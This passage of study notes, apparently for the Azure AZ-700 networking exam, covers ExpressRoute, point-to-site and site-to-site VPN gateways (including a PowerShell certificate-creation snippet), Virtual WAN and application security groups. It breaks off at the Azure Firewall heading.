<li>Connectivity can be from an any-to-any (IPVPN) network, a point-to-point Ethernet network, or a virtual cross-connection through a connectivity provider at a co-location facility.</li>
<li>Connectivity to Microsoft cloud services across all regions in the geopolitical region.</li>
<li>Global connectivity to Microsoft services across all regions with the ExpressRoute premium add-on.</li>
<li>Built-in redundency in every peering location for high availability.</li>
</ul>
<h2 id="private-vs-public-peering"><a class="header" href="#private-vs-public-peering">Private vs. Public Peering</a></h2>
<p>Peering refers to the connection between two networks for traffic exchange.</p>
<ul>
<li>Private peering allows remote networks to access Azure vNets and resources connected to those vNets, such as infrastructure and PaaS services.</li>
<li>Public peering allows remote networks to access Microsoft Cloud services such as Office 365 and Azure Platform services.</li>
</ul>
<h2 id="expressroute-components"><a class="header" href="#expressroute-components">ExpressRoute Components</a></h2>
<ul>
<li>
<p><strong>On-prem devices</strong>: Devices located physically within an organization‚Äôs premises</p>
</li>
<li>
<p><strong>Customer Edge (CE) router</strong>: The on-premises router that connects to the service provider‚Äôs edge router.</p>
</li>
<li>
<p><strong>Provider Edge (PE) devices CE Routers</strong>: These are devices used by providers to connect to the CE router.</p>
</li>
<li>
<p><strong>Partner Edge devices facing Microsoft Edge routers</strong>: These are devices used by ExpressRoute service providers to connect to Microsoft Edge routers</p>
</li>
<li>
<p><strong>Microsoft Edge Routers</strong>: These are redundant pairs of routers on the Microsoft side of the ExpressRoute connection.</p>
</li>
<li>
<p><strong>ExpressRoue vNet Gateway</strong>: This service connects an ExpressRoute connection with an Azure vNet.</p>
</li>
<li>
<p><strong>Azure vNet</strong>: A virtual network in Azure that can be connected to an ExpressRoute circuit.</p>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/express-route-components.png" alt="ExpressRoute Components"></p>
</li>
</ul>
<h2 id="expressroute-connectivity-models"><a class="header" href="#expressroute-connectivity-models">ExpressRoute Connectivity Models</a></h2>
<p>When architecting an ExpressRoute connection, you can choose from two different connectivity models:</p>
<ul>
<li>
<p><strong>Provider Model</strong>: The provider model connects a remote network to Azure using a third-party provider. To establish this connection, we need to work with the provider to set up the connection. Depending on the service offering the ExpressRoute partner provides, we have up to 3 connectivity options that we can implement:</p>
<ul>
<li>
<p>Cloud Exchange co-location</p>
<ul>
<li>This involves moving our infrastructure into a data center where the ExpressRoute partner has a presence. We can then order virtual cross-connections to the Microsoft network. The cross-connect could be a layer 2 or layer 3 connection.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/express-route-components.png" alt=""></li>
</ul>
</li>
<li>
<p>Point-to-point Ethernet connection</p>
<ul>
<li>This involves working with an ISP that provides single-site layer 2 or layer 3 connectivity between the remote network and the Azure vNet. The key point with this option is that connectivity is for a single customer site.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-point2point.png" alt=""></li>
</ul>
</li>
<li>
<p>Any-to-Any IPVPN connection</p>
<ul>
<li>This option leverages ISP-provided MPLS connectivity to connect multiple customer sites with the Microsoft cloud network. This model is recommended for customers with existing MPLS connections.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-any2any.png" alt=""></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>ExpressRoute Direct Model</strong>:</p>
<ul>
<li>
<p>This model allows a customer‚Äôs network to connect directly to Microsoft at peering locations strategically placed around the world, with a 10 Gbps or dual 100 Gbps connection.</p>
</li>
<li>
<p>This model supports active/active connectivity at scale</p>
</li>
<li>
<p>This model does not rely on a third party for ExpressRoute connectivity.</p>
</li>
<li>
<p>This model is good when very high bandwidth is required.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-direct.png" alt=""></p>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-direct-vs-provider.png" alt=""></p>
</li>
</ul>
</li>
</ul>
<h2 id="route-advertisement"><a class="header" href="#route-advertisement">Route Advertisement</a></h2>
<ul>
<li>When Microsoft peering gets configured on your ExpressRoute circuit, the Microsoft Edge routers establish a pair of BGP sessions with your edge routers through your connectivity provider. No routes are advertised to your network by default. To enable router advertisements, you must associate a route filter.</li>
</ul>
<h2 id="expressroute-circuit-skus"><a class="header" href="#expressroute-circuit-skus">ExpressRoute Circuit SKUs</a></h2>
<ul>
<li>
<p>ExpressRoute circuits are offered in three SKUs:</p>
<ul>
<li>Local
<ul>
<li>Can be used to provide connectivity to vNets in one or two Azure regions in the same metro/geographical area.</li>
<li>Not all ExpressRoute locations support the ‚ÄòLocal‚Äô SKU</li>
<li>One benefit of the local SKU is there is no additional cost for transferring data out of Azure through the ExpressRoute connection (egress data).</li>
</ul>
</li>
<li>Standard
<ul>
<li>Can provide connectivity to vNets and Azure services in Azure regions in a geopolitical area. For example, all regions in North America.</li>
<li>Egress data transfer is an added cost.</li>
<li>There are two billing models for egress data. Metered and Unlimited.
<ul>
<li>Metered requires that you estimate how much egress data you will use, and you only pay for that amount.</li>
<li>Unlimited allows you to use any amount of data but has a fixed monthly fee.</li>
</ul>
</li>
</ul>
</li>
<li>Premium
<ul>
<li>Can provide connectivity to vNets globally.</li>
<li>There are two billing models for egress data. Metered and Unlimited.
<ul>
<li>Metered requires that you estimate how much egress data you will use, and you only pay for that amount.</li>
<li>Unlimited allows you to use any amount of data but has a fixed monthly fee.</li>
</ul>
</li>
<li>The premium SKU is required if you plan to use Microsoft peering to access Microsoft SaaS/PaaS services over the ExpressRoute connection.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ExpressRoute circuits are offered in three SKUs: Local, Standard and Premium. (Two shown below)</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>ExpressRoute Standard</th><th>ExpressRoute Premium</th></tr>
</thead>
<tbody>
<tr><td>Global Reach</td><td>No</td><td>Yes</td></tr>
<tr><td>Increased Route Limits</td><td>No</td><td>Yes</td></tr>
<tr><td>Connectivity to Microsoft Peering</td><td>Limited to the same geopolitical region</td><td>Global connectivity</td></tr>
<tr><td>Service Providers</td><td>Limited</td><td>Expanded</td></tr>
<tr><td>Route Advertisements</td><td>4,000</td><td>10,000</td></tr>
<tr><td>Support for Azure Government and National Clouds</td><td>No</td><td>Yes</td></tr>
<tr><td>BGP Communities</td><td>No</td><td>Yes</td></tr>
<tr><td>BGP Sessions</td><td>2 per peering, per ExpressRoute circuit</td><td>4 per peering, per ExpressRoute circuit</td></tr>
<tr><td>Cost</td><td>Lower</td><td>Higher</td></tr>
<tr><td>Availability</td><td>Varies by region</td><td>Varies by region</td></tr>
</tbody>
</table>
</div>
<p><img src="clouds/azure/az700/images/expressroute-circuit-sku.png" alt=""></p>
</li>
</ul>
<h2 id="expressroute-gateway-skus"><a class="header" href="#expressroute-gateway-skus">ExpressRoute Gateway SKUs</a></h2>
<ul>
<li>When we create an ExpressRoute Gateway service, we need to specify the SKU that we want to use. We can choose from one of the following three:
<ul>
<li><strong>Standard / ErGw1AZ</strong>: This option supports a max of four ExpressRoute connections and up to 1 Gbps bandwidth</li>
<li><strong>High Performance / ErGw2AZ</strong>: This options supports a max of eight ExpressRoute connections and up to 2 Gbps bandwidth</li>
<li><strong>Ultra Performance / ErGw3AZ</strong>: This options support a max of 16 ExpressRoute connections and up to 10 Gbps bandwidth</li>
</ul>
</li>
<li>The SKUs with ‚ÄòAZ‚Äô in the name are zone-redundant, meaning they are highly available across Azure Availability Zones.</li>
<li>We can change a SKU after the Gateway has been created</li>
<li>An ExpressRoute Gateway must be deployed in a Gateway subnet. (Named ‚ÄòGatewaySubnet‚Äô). It is recommended to use at least a <code>/26</code> for the GatewaySubnet.</li>
<li>When choosing a Gateway SKU, we want to ensure the bandwidth of the SKU matches the bandwidth of the circuit.
<a href="https://learn.microsoft.com/en-us/azure/expressroute/expressroute-about-virtual-network-gateways">ExpressRoute Gateway SKUs</a></li>
</ul>
<h2 id="expressroute-fastpath"><a class="header" href="#expressroute-fastpath">ExpressRoute FastPath</a></h2>
<p>FastPath is designed to improve the data path performance between connected remote networks and Azure vNets. To understand how FastPath works, we need to understand the default behavior without it. By default, the ExpressRoute Gateway performs two main tasks: exchanging network routes with our remote networks AND routing network traffic to Azure vNet resources. Routing the network traffic adds a little processing overhead, which impacts performance metrics such as Packets per Second (PPS) and Connections per Second (CPS). When enabled, FastPath sends network traffic directly to vNet resources, bypassing the gateway. This results in higher bandwidth and better overall performance. FastPath is available for all ExpressRoute circuits, but the ExpressRoute Gateway must be either the ultra-performance or ErGw3AZ SKU.</p>
<h2 id="encryption-over-expressroute"><a class="header" href="#encryption-over-expressroute">Encryption over ExpressRoute</a></h2>
<ul>
<li>By default, ExpressRoute connections are not encrypted.</li>
<li>Microsoft offers two optional solutions for encrypting data in transit over ExpressRoute connections:
<ul>
<li><strong>MACsec</strong> - a Layer 2 encryption protocol that can be used to encrypt physical links. To implement MACsec, we need a Key Vault to store the encryption keys. This key is referred to as the connectivity association key (CAK).</li>
<li><strong>IPSec</strong> - a Layer 3 encryption protocol that can be used to encrypt data between two endpoints. To implement IPSec, we need to configure a VPN Gateway in Azure and a VPN device on-premises.</li>
</ul>
</li>
</ul>
<h2 id="bfd"><a class="header" href="#bfd">BFD</a></h2>
<ul>
<li>BFD (Bidirectional Forwarding Detection) is a network protocol that detects link failures in a network. It is used to detect failures in the forwarding plane of a network.</li>
<li>BFD is supported over private peering and Microsoft peering.</li>
<li>When you enable BFD, you can speed up failure detection between Microsoft Enterprise Edge (MSEE) devices and your equipment.</li>
<li>How it works:
<ul>
<li>On the MSEE devices, BGP keep-alive and hold-time are typically configured as 60 and 180 seconds, respectively. For that reason, when a link failure happens, it can take up to three minutes to detect the failure and switch traffic to an alternate connection.</li>
<li>You can control the BGP timers by configuring a lower BGP keep-alive and hold-time on your edge peering device. If the BGP timers are not the same between the two peering devices, the BGP session will establish using the lower time value. The BGP keep-alive can be set as low as 3 seconds. The hold-time can be as low as 10 seconds. However, setting these values too low isn‚Äôt recommended because the protocol is process-intensive.</li>
</ul>
</li>
</ul>
<h2 id="configure-expressroute-and-site-to-site-coexisting-connections"><a class="header" href="#configure-expressroute-and-site-to-site-coexisting-connections">Configure ExpressRoute and site to site coexisting connections</a></h2>
<ul>
<li>
<p>You can configure Site-to-Site VPN as a secure failover path for ExpressRoute or use Site-to-Site VPNs to connect to sites that are not connected through ExpressRoute.</p>
</li>
<li>
<p>Configuring Site-to-Site VPN and ExpressRoute coexisting connections has several advantages:
-You can configure a Site-to-Site VPN as a secure failover path for ExpressRoute.</p>
<ul>
<li>Alternatively, you can use Site-to-Site VPNs to connect to sites that are not connected through ExpressRoute.</li>
</ul>
</li>
<li>
<p>You can configure either gateway first. Typically, you will incur no downtime when adding a new gateway or gateway connection.</p>
</li>
<li>
<p>Network Limits and limitations</p>
<ul>
<li>Only route-based VPN gateway is supported. You must use a route-based VPN gateway. You also can use a route-based VPN gateway with a VPN connection configured for ‚Äòpolicy-based traffic selectors‚Äô.</li>
<li>The ASN of Azure VPN Gateway must be set to 65515. Azure VPN Gateway supports the BGP routing protocol. For ExpressRoute and Azure VPN to work together, you must keep the Autonomous System Number of your Azure VPN gateway at its default value, 65515. If you previously selected an ASN other than 65515 and you change the setting to 65515, you must reset the VPN gateway for the setting to take effect.</li>
<li>The gateway subnet must be /27 or a shorter prefix, (such as /26, /25), or you will receive an error message when you add the ExpressRoute virtual network gateway.</li>
<li>Coexistence in a dual stack VNet is not supported. If you are using ExpressRoute IPv6 support and a dual-stack ExpressRoute gateway, coexistence with VPN Gateway will not be possible.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpn"><a class="header" href="#vpn">VPN</a></h1>
<h2 id="what-is-a-vpn"><a class="header" href="#what-is-a-vpn">What is a VPN?</a></h2>
<ul>
<li>A VPN (Virtual Private Network) is a service that allows you to connect to the internet via an encrypted tunnel to ensure your online privacy and protect your sensitive data.</li>
</ul>
<h2 id="azure-point-to-site-vpn"><a class="header" href="#azure-point-to-site-vpn">Azure Point to Site VPN</a></h2>
<ul>
<li>Azure Point-to-Site VPN is a secure connection between a virtual network in Azure and a client computer. VPN is used to connect the client to the Azure virtual network.</li>
<li>The VPN connection is encrypted and provides secure access to on-premises resources.</li>
<li>The VPN client is installed on the client computer and is used to connect to the Azure virtual network.</li>
<li>The VPN client is used to connect to the Azure virtual network.</li>
<li>The Virtual Network Gateway is used to connect the on-premises network to the Azure virtual network.</li>
<li>P2S VPN Connections require that you configure 3 configuration settings in Azure (in addition to a VNG, etc.):
<ul>
<li>Address Pool: The IP address range that will be assigned to the VPN clients.
<ul>
<li>The address range that you choose must not overlap with the vNet‚Äôs address range.</li>
<li>If multiple protocols are configured for the tunnel type, and SSTP is one of those protocols, the address pool will be split between the configured protocols.</li>
</ul>
</li>
<li>Tunnel Type: The tunnel type that will be used for the VPN connection. Options are SSTP, IKEv2, and OpenVPN.
<ul>
<li>OpenVPN is SSL-based and operates on port 443.
<ul>
<li>OpenVPN is supported on all platforms, but a client will usually need to be downloaded and installed.</li>
<li>OpenVPN is required if you want clients to authenticate with Azure Active Directory credentials.</li>
</ul>
</li>
<li>SSTP is SSL-based and operates on port 443. It is a Microsoft-proprietary protocol.</li>
<li>IKEv2 is IPsec-based and operates on UDP ports 4500 and 500 and IP protocol number 50.
<ul>
<li>Android, Linux, iOS, MacOS, and Windows 10 (and above) come pre-installed with clients that support IKEv2.</li>
<li>Windows client will try IKEv2 first when negotiating a connection. They fall back to SSTP.</li>
</ul>
</li>
</ul>
</li>
<li>Authentication Type: The authentication type that will be used for the VPN connection. Options are Azure Certificate, Azure AD, and Radius.
<ul>
<li>Azure Certificate: The client must have a client certificate installed to connect to the Azure Virtual Network Gateway.
<ul>
<li>The client certificate must be installed in the ‚ÄòLocal Machine‚Äô certificate store on the client computer.</li>
<li>The Virtual Network Gateway must have the public key of the client certificate uploaded to the Azure Virtual Network Gateway. Or the public key of the root certificate that signed the client certificate.</li>
</ul>
</li>
<li>Azure AD: The client must have an Azure Active Directory account to connect to the Azure Virtual Network Gateway.
<ul>
<li>Allows users to connect to the VPN using their Azure AD credentials.</li>
<li>Native Azure AD authentication is only supported for OpenVPN connections that use the Azure VPN Client for Windows 10 or later and MacOS clients.</li>
<li>The main advantage here is we can benefit from additional identity and security capabilities provided by Azure AD, such as MFA.</li>
</ul>
</li>
<li>Radius: The client must have a Radius account to connect to the Azure Virtual Network Gateway. Clients authentication against a RADIUS server hosted in Azure or on-premises.
<ul>
<li>The Virtual Network Gateway forwards authentication requests to/from the client and RADIUS server. Connectivity is important!</li>
<li>The RADIUS server can be implemented to integrate with Azure Entra ID or any other external identity system. No need to upload root certificates and revoke client certificates in Azure.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>P2S connections require a route-based VPN Type.</li>
</ul>
<h2 id="azure-site-to-site-vpn"><a class="header" href="#azure-site-to-site-vpn">Azure Site to Site VPN</a></h2>
<ul>
<li>Azure Site-to-Site VPN is a secure connection between an on-premises network and an Azure virtual network.</li>
<li>The VPN connection is encrypted and provides secure access to on-premises resources.</li>
<li>The VPN connection is established between the on-premises network and the Azure virtual network.</li>
<li>The Virtual Network Gateway is used to connect the on-premises network to the Azure virtual network.</li>
</ul>
<h2 id="virtual-network-gateway"><a class="header" href="#virtual-network-gateway">Virtual Network Gateway</a></h2>
<ul>
<li>
<p>A Virtual Network Gateway is used to send encrypted traffic between an Azure virtual network and an on-premises location over the public internet.</p>
</li>
<li>
<p>Virtual Network Gateway supports the following hybrid connection options:</p>
<ul>
<li><strong>Site to Site VPN connection over IPSec (IKE v1 and IKE v2)</strong> - This option can be used to connect an on-premises network to an Azure virtual network.</li>
<li><strong>Point to Site VPN connection over SSTP (Secure Socket Tunneling Protocol)</strong> - This option can be used to connect a client computer to an Azure virtual network.</li>
<li><strong>VNet to VNet VPN connection over IPSec (IKE v1 and IKE v2)</strong> - This option can be used to connect two Azure virtual networks.</li>
</ul>
</li>
<li>
<p>When implementing the VPN Gateway to connect two vNets, there are two connection types you can choose from:</p>
<ul>
<li>vNet-to-vNet: If the source and targets vNets are in the same Azure subscription, choose this option.</li>
<li>Site-to-Site (IPsec): If the source and target vNets are not in the same Azure subscription, choose this option.</li>
</ul>
</li>
</ul>
<h3 id="virtual-network-gateway-skus"><a class="header" href="#virtual-network-gateway-skus">Virtual Network Gateway SKUs</a></h3>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/vpn-gateway-skus.png" alt="Virtual Network Gateway SKUs"></p>
<h3 id="virtual-network-gateway-pricing"><a class="header" href="#virtual-network-gateway-pricing">Virtual Network Gateway Pricing</a></h3>
<pre><code>| SKU | Price |
| --- | --- |
| Basic | $0.04/hour |
| VpnGw1 | $0.19/hour |
| VpnGw2 | $0.49/hour |
| VpnGw3 | $1.25/hour |
| VpnGw4 | $2.10/hour |
| VpnGw5 | $3.65/hour |
</code></pre>
<h3 id="virtual-network-gateway-certificate-authentication"><a class="header" href="#virtual-network-gateway-certificate-authentication">Virtual Network Gateway Certificate Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports certificate authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have a client certificate installed to connect to the Azure Virtual Network Gateway.</li>
<li>The client certificate must be installed in the ‚ÄòLocal Machine‚Äô certificate store on the client computer.</li>
</ul>
<pre><code># Create a self-signed root certificate
$params = @{
    Type = 'Custom'
    Subject = 'CN=P2SRootCert'
    KeySpec = 'Signature'
    KeyExportPolicy = 'Exportable'
    KeyUsage = 'CertSign'
    KeyUsageProperty = 'Sign'
    KeyLength = 2048
    HashAlgorithm = 'sha256'
    NotAfter = (Get-Date).AddMonths(24)
    CertStoreLocation = 'Cert:\CurrentUser\My'
}
$cert = New-SelfSignedCertificate @params

# Create a self-signed client certificate
$params = @{
       Type = 'Custom'
       Subject = 'CN=P2SChildCert'
       DnsName = 'P2SChildCert'
       KeySpec = 'Signature'
       KeyExportPolicy = 'Exportable'
       KeyLength = 2048
       HashAlgorithm = 'sha256'
       NotAfter = (Get-Date).AddMonths(18)
       CertStoreLocation = 'Cert:\CurrentUser\My'
       Signer = $cert
       TextExtension = @(
        '2.5.29.37={text}1.3.6.1.5.5.7.3.2')
   }
   New-SelfSignedCertificate @params
</code></pre>
<h3 id="azure-active-directory-authentication"><a class="header" href="#azure-active-directory-authentication">Azure Active Directory Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports Azure Active Directory authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have an Azure Active Directory account to connect to the Azure Virtual Network Gateway.</li>
<li>You must register an Azure AD application and grant permissions to the application to use the Azure Virtual Network Gateway.</li>
<li>You must set the authentication type to ‚ÄòAzure Active Directory‚Äô in the Azure Virtual Network Gateway configuration.
<ul>
<li>You must provide the Tenant ID, Audience (client Id of app), and Issuer of the Azure AD application in the Azure Virtual Network Gateway configuration.</li>
</ul>
</li>
<li>Download and install the Azure VPN Client from the MS Store</li>
<li>Sign in with your Azure AD account to connect to the Azure Virtual Network Gateway.</li>
</ul>
<h3 id="radius-authentication"><a class="header" href="#radius-authentication">Radius Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports Radius authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have a Radius account to connect to the Azure Virtual Network Gateway.</li>
<li>You must configure the Radius server settings in the Azure Virtual Network Gateway configuration.</li>
<li>You must provide the Radius server IP (primary and secondary) and Radius server secret (primary and secondary)</li>
</ul>
<h2 id="local-network-gateway"><a class="header" href="#local-network-gateway">Local Network Gateway</a></h2>
<ul>
<li>A Local Network Gateway is a representation of the on-premises location. It contains the public IP address of the on-premises location and the address space.</li>
</ul>
<h2 id="gateway-subnet"><a class="header" href="#gateway-subnet">Gateway Subnet</a></h2>
<ul>
<li>The gateway subnet is used to deploy the virtual network gateway. The gateway subnet must be named ‚ÄòGatewaySubnet‚Äô to work properly.</li>
<li>The size of the gateway subnet must be at least /29 or larger.</li>
<li>Nothing must be deployed in the gateway subnet. It is used by the gateway services only.</li>
</ul>
<h3 id="route-based-vs-policy-based-vpn"><a class="header" href="#route-based-vs-policy-based-vpn">Route based vs. Policy based VPN</a></h3>
<ul>
<li>
<p><strong>Policy-based VPN</strong> - This type of VPN uses a policy defined on the VPN to determine where to send traffic. The policy defines an access list of traffic that should be sent through the VPN tunnel.</p>
<ul>
<li>Limitations:
<ul>
<li>There is no support for dynamic routing protocols such as BGP.</li>
<li>It can only be used to establish site-to-site VPN connections.</li>
<li>It only supports 1 tunnel when implemented with the basic gateway.</li>
<li>If you have a legacy on-prem VPN device that does not support route-based VPNs, you will likely need to create a policy-based VPN.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Route-based VPN</strong> - This type of VPN uses a routing table to determine where to send traffic. The routing table is used to determine the next hop for the traffic.</p>
<ul>
<li>Only route-based gateway SKUs support active/active mode.</li>
<li>Point-to-site connections require a route-based VPN gateway.</li>
</ul>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/route-vs-policy-based-vpn.png" alt="Route-based VPN"></p>
</li>
</ul>
<h2 id="troubleshoot-vpns"><a class="header" href="#troubleshoot-vpns">Troubleshoot VPNs</a></h2>
<ul>
<li>There are several diagnostic logs you can reference when troubleshooting VPN Connections and Virtual Network Gateways
<ul>
<li><strong>Gateway Diagnostic Log</strong>: This log contains diagnostic logs for the gateway, including configuration changes and maintenance events.</li>
<li><strong>Tunnel Diagnostic Log</strong>: This log contains tunnel state change events. This log is useful to view the historical connectivity status of the tunnel.</li>
<li><strong>Route Diagnostic Log</strong>: This log contains routing logs, including changes to static routes and BGP events</li>
<li><strong>IKE Diagnostic Log</strong>: This log contains IKE control messages and events on the gateway.</li>
<li><strong>P2S Diagnostic Log</strong>: This log contains point-to-site control messages and events on the gateway.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-wan"><a class="header" href="#azure-virtual-wan">Azure Virtual WAN</a></h1>
<p><img src="clouds/azure/az700/images/vwan.png" alt=""></p>
<h2 id="overview-6"><a class="header" href="#overview-6">Overview</a></h2>
<ul>
<li><strong>Azure Virtual WAN (vWAN)</strong>: A networking service that provides optimized and automated branch connectivity to, and through, Azure.</li>
<li><strong>Virtual Hub</strong>: A Microsoft-managed virtual network that enables connectivity between your on-premises networks, Azure VNets, and remote users.</li>
</ul>
<h2 id="key-features-3"><a class="header" href="#key-features-3">Key Features</a></h2>
<ol>
<li><strong>Centralized Management</strong>: Simplifies the management of large-scale network architectures by providing a single pane of glass for managing connectivity.</li>
<li><strong>Scalability</strong>: Designed to handle thousands of VNets, branch connections, and users.</li>
<li><strong>High Availability</strong>: Built-in redundancy and high availability for critical network connections.</li>
<li><strong>Security</strong>: Integrated with Azure Firewall, DDoS protection, and other security services for comprehensive protection.</li>
<li><strong>Connectivity</strong>: Supports Site-to-Site VPN, Point-to-Site VPN, ExpressRoute, and Azure Private Link.</li>
</ol>
<h2 id="components-3"><a class="header" href="#components-3">Components</a></h2>
<ul>
<li><strong>Virtual WAN</strong>: A management service that we can use to deploy, manage, and monitor resources for connecting networks together. This is a global resource and does not live in a particular network.</li>
<li><strong>vWAN Hubs</strong>: Regional virtual network hubs that provide central connectivity and routing. A virtual hub is a Microsoft-managed virtual network. The hub contains various service endpoints to enable connectivity. From your on-premises network (vpnsite), you can connect to a VPN gateway inside the virtual hub, connect ExpressRoute circuits to a virtual hub, or even connect mobile users to a point-to-site gateway in the virtual hub. The hub is the core of your network in a region. Multiple virtual hubs can be created in the same region. A hub gateway isn‚Äôt the same as a virtual network gateway that you use for ExpressRoute and VPN Gateway. For example, when using Virtual WAN, you don‚Äôt create a site-to-site connection from your on-premises site directly to your VNet. Instead, you create a site-to-site connection to the hub. The traffic always goes through the hub gateway. This means that your VNets don‚Äôt need their own virtual network gateway. Virtual WAN lets your VNets take advantage of scaling easily through the virtual hub and the virtual hub gateway.</li>
<li><strong>vWAN HUB Connections</strong>: Connections between a hub and a VNet in the same region. A vNet can only be connected to one hub.</li>
<li><strong>Hub-to-Hub Connections</strong>: Connectivity between hubs in different regions for global reach. Hubs are all connected to each other in a virtual WAN. This implies that a branch, user, or VNet connected to a local hub can communicate with another branch or VNet using the full mesh architecture of the connected hubs. You can also connect VNets within a hub transiting through the virtual hub, as well as VNets across hub, using the hub-to-hub connected framework.</li>
<li><strong>Branch-to-Hub Connections</strong>: Site-to-site VPN connections from on-premises locations to the hub.</li>
<li><strong>User VPN Connections</strong>: Point-to-site VPN connections from remote users to the hub.</li>
</ul>
<h2 id="use-cases-7"><a class="header" href="#use-cases-7">Use Cases</a></h2>
<ol>
<li><strong>Branch Connectivity</strong>: Simplifies the connection of branch offices to Azure and to each other.</li>
<li><strong>Global Network Architecture</strong>: Centralizes and optimizes connectivity between VNets and on-premises networks across multiple regions.</li>
<li><strong>Remote Access</strong>: Provides secure access for remote users through point-to-site VPN.</li>
</ol>
<h2 id="benefits-2"><a class="header" href="#benefits-2">Benefits</a></h2>
<ul>
<li><strong>Simplified Configuration</strong>: Reduces the complexity of managing multiple VNets and connections.</li>
<li><strong>Optimized Performance</strong>: Leverages Microsoft‚Äôs global backbone for high performance and low latency.</li>
<li><strong>Cost-Effective</strong>: Reduces the need for expensive hardware and dedicated network connections.</li>
</ul>
<h2 id="types-of-vwan"><a class="header" href="#types-of-vwan">Types of vWAN</a></h2>
<ul>
<li>Basic
<ul>
<li>Only supports site-to-site VPN connections in a single hub (no hub-to-hub, ExpressRoute, or user VPN connections).</li>
<li>There is a cost advantage in that we do not have to pay the base hourly fee and data processing free for the vWAN hubs that we implement.</li>
</ul>
</li>
<li>Standard
<ul>
<li>Supports all connectivity types across multiple hubs.</li>
<li>There is an hourly base fee for every hub that we create (.25/hour).</li>
</ul>
</li>
<li>You can change the SKU after the vWAN has been created. You can upgrade a basic to a standard, but you cannot downgrade a standard to a basic.</li>
</ul>
<h2 id="routing-infrastructure-units-rius"><a class="header" href="#routing-infrastructure-units-rius">Routing Infrastructure Units (RIUs)</a></h2>
<ul>
<li>When a new vWAN is created, virtual hub routers are deployed into it. The virtual hub router is the central component that manages all routing between vNETs and gateways.</li>
<li>A Routing Infrastructure Unit (RIU) is a unit of scale that defines both the aggregate throughput of the virtual hub router and the aggregate number of virtual machines that can be deployed in all connected VNets.</li>
<li>By default, the virtual hub router will deploy 2 RIUs with no extra cost. The 2 units support 3 Gbps of throughput and 2000 connections across all connected vNETs.</li>
<li>You can add additional RIUs in increments of 1 Gbps of throughput and 1000 VM connections.</li>
<li>There is an additional cost of .10/RIU above the 2 that are included.</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Routing infrastructure unit</th><th>Aggregate throughput (Gbps)</th><th>Number of VMs</th></tr>
</thead>
<tbody>
<tr><td>2</td><td>3</td><td>2000</td></tr>
<tr><td>3</td><td>3</td><td>3000</td></tr>
<tr><td>4</td><td>4</td><td>4000</td></tr>
<tr><td>5</td><td>5</td><td>5000</td></tr>
<tr><td>6</td><td>6</td><td>6000</td></tr>
<tr><td>7</td><td>7</td><td>7000</td></tr>
<tr><td>8</td><td>8</td><td>8000</td></tr>
<tr><td>9</td><td>9</td><td>9000</td></tr>
<tr><td>10</td><td>10</td><td>10000</td></tr>
</tbody>
</table>
</div>
<h2 id="site-to-site-connectivity-with-vwan"><a class="header" href="#site-to-site-connectivity-with-vwan">Site to Site Connectivity with vWAN</a></h2>
<ul>
<li>You can connect remote networks to the vWAN hub using site-to-site VPN connections or ExpressRoute.</li>
<li>To deploy a site to site VPN connection, we need to deploy a Site-to-Site VPN Gateway into our vWAN hub by specifying the number of gateway scale units we want. The number that we specify for the Gateway Scale Units defines the aggregate maximum throughput for the VPN connections.</li>
<li>S2S VPN Gateway instances in a vWAN hub are always deployed in an active-active configuration for high availability.</li>
<li>a VPN Gateway in a vWAN hub is limited to 30 connections while 20 Gateway Scale Units in a vWAN hub can support up to 1000 connections.</li>
</ul>
<h2 id="routing-order-precedence"><a class="header" href="#routing-order-precedence">Routing Order Precedence</a></h2>
<ul>
<li>If multiple paths exist for a destination subnet, the virtual hub router uses the following logic to determine the route to the destination:
<ol>
<li>Routes with the longest prefix match are always preferred</li>
<li>Static routes are preferred over routes learned via BGP</li>
<li>The best path is selected based on the route preference configured (ExpressRoute-learned route, VPN-learned route, or the route with the shortest BGP AS-Path Length)</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="secure-and-monitor-networks"><a class="header" href="#secure-and-monitor-networks">Secure-and-monitor-networks</a></h1>
<h2 id="directory-map-9"><a class="header" href="#directory-map-9">Directory Map</a></h2>
<ul>
<li><a href="#application-security-groups">asg</a></li>
<li><a href="#azure-firewall">azure-firewall</a></li>
<li><a href="#ddos-protection">ddos-protection</a></li>
<li><a href="#network-watcher">network-watcher</a></li>
<li><a href="#network-security-groups">nsg</a></li>
<li><a href="#web-application-firewall">waf</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="application-security-groups"><a class="header" href="#application-security-groups">Application Security Groups</a></h1>
<h2 id="introduction-24"><a class="header" href="#introduction-24">Introduction</a></h2>
<ul>
<li>Application Security Groups (ASGs) are used to group virtual machines and apply network security group rules to the group</li>
</ul>
<h2 id="benefits-3"><a class="header" href="#benefits-3">Benefits</a></h2>
<ul>
<li>Simplifies network security group management</li>
<li>Reduces the number of rules that need to be created</li>
<li>Allows for more granular control over network security group rules</li>
</ul>
<h2 id="example-2"><a class="header" href="#example-2">Example</a></h2>
<ul>
<li>Create an ASG</li>
<li>Add VMs to the ASG</li>
<li>Add the ASG as a traffic source in a network security group rule</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-firewall"><a class="header" href="#azure-firewall">Azure Firewall</a></h1>
